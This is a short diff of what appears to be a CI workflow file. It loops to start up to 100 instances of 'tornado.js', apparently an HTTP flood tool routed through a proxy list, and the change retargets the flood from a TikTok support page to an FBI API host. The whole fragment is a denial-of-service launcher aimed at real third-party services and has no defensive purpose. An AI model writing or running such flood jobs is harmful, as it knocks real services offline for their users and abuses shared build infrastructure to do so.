@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 70 node tornado.js GET https://support.tiktok.com/en 70 16 64 proxies.txt --full --query 3
+            timeout 70 node tornado.js GET https://api.fbi.gov/ 70 16 64 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
